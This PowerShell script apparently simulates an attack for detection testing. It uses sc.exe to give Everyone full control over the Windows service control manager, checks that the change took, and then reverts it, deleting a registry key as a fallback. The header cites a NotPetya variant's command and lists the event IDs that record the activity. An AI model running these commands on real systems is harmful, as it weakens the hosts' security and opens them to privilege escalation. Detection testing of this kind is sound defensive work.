<#
    T1543.003 - Create or Modify System Process: Windows Service
    T1569.002 - System Services: Service Execution
    T1112 - Modify Registry
    
    Allow every users to start system service
    FI: variants of Notpetya Ransomware used 'sc.exe sdset scmanager D:(D;;0x00040002;;;NU)%a'

    traces:
      - Microsoft-Windows-Sysmon: EventID 1
      - security: EventID 4688,4657
      - Microsoft-Windows-PowerShell/Operational: EventID 4104
      - Microsoft-Windows-Security-Mitigations/KernelMode: EventID 3 
        - example: Process '\Device\HarddiskVolume3\Windows\System32\cmd.exe' (PID 6544) would have been blocked from creating a child process 'C:\Windows\system32\sc.exe' with command line 'sc.exe  sdset scmanager D:(A;;KA;;;WD)')
    ref:
      - https://twitter.com/0gtweet/status/1628720819537936386
      - https://twitter.com/guyrleech/status/1628728693651566594
      - https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force -Verbose
function check_compromised{
    $compromised = ConvertFrom-SddlString -Sddl $(sc.exe sdshow scmanager|Select-Object -last 1)| Select-Object -Expand DiscretionaryAcl | Select-String Everyone | Select-String FullControl
    if($compromised){
        return $true
    }
    else{
        return $false
    }
}

try{
    if (-not (check_compromised)){
        $original_conf = sc.exe sdshow scmanager
        Write-host -ForegroundColor Cyan "[Info] Allowing everyone to create new system service with command: $scmanager_allow"
        sc.exe sdset scmanager 'D:(A;;KA;;;WD)'
        if(check_compromised){
            Write-Host -ForegroundColor Green "[Success] Everyone can now create new system services:`n  $compromised"
            Write-Host -ForegroundColor Cyan "[Info] Reverting changes..."
            sc.exe sdset scmanager $original_conf
            if(check_compromised){
                Write-Host -ForegroundColor Yellow "[Warning] Failed to revert changes back to the original configuration that was:`n $original_conf`nthe system is still compromised"
                Write-Host -ForegroundColor Cyan "[Info] Trying to revert changes with default configuration: 'D:(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)(A;;CC;;;AC)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)'"
                sc.exe sdset scmanager 'D:(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)(A;;CC;;;AC)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)'
                if(check_compromised){
                    Write-Host -ForegroundColor Yellow "[Warning] Failed to revert changes done above, the machine is still compromise, trying registry deletion..."
                    $regkey = "HKLM:\SYSTEM\CurrentControlSet\Control\ServiceGroupOrder\Security"
                    Write-Host -ForegroundColor Cyan "[Info] Deleting registry key: $regkey to reset default right at next reboot"
                    Remove-Item  $regkey -Recurse -Force -Verbose
                    if(Get-Item $regkey -Verbose){
                        Write-Host -ForegroundColor Green "[Success] registry $regkey key deleted: reboot manually to take effect"
                    }
                    else{
                        Write-Host -ForegroundColor Red "[Error] Failed to delete registry key $regkey, the system is still compromised, investigate manually"
                    }
                }
                else{
                    Write-Host -ForegroundColor Green "[Success] Changes reverted with windows default configuration successfully"
                }
            }
            else{
                Write-Host -ForegroundColor Green "[Success] Changes reverted back to the original configuration successfully"
            }
        }
        else{
            Write-Host -ForegroundColor Red "[Error] Failed to allow everyone to create new system services"
        }
    }
    else{
        Write-Host -ForegroundColor Magenta "[Alert] Everyone already has full control on scmanager, this is not the expected configuration !`nstopping simulation"
    }
}
catch{
    Write-Host -ForegroundColor Red "[Error] Exception: $_"
}

#note: interresting options: Deny Network(block PSEXEC) (D;;GA;;;NU), Deny Everyone (D;;GA;;;WD), Deny Local System (D;;GA;;;SY), Deny Administrators (D;;GA;;;BA), Deny Authenticated Users (D;;GA;;;AU), Deny Interactive (D;;GA;;;IU), Deny Network Service (D;;GA;;;NS), Deny Local Service (D;;GA;;;LS), Deny Remote Desktop Users (D;;GA;;;RU), Deny Terminal Server Users (D;;GA;;;TS)

Stop-Transcript -Verbose
